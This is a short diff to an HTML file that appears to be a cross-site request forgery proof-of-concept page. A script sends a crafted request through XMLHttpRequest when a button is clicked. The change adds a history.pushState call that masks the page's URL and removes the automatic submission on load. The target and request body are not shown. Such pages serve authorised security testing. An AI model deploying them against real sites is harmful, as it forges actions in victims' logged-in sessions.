@@ -1,5 +1,6 @@
 <html>
   <body>
+    <script>history.pushState('', '', '/');</script>
     <script>
       function submitRequest()
       {
@@ -15,7 +16,6 @@
           aBody[i] = body.charCodeAt(i); 
         xhr.send(new Blob([aBody]));
       }
-      submitRequest();
     </script>
     <form action="#">
       <input type="button" value="Submit request" onclick="submitRequest();" />
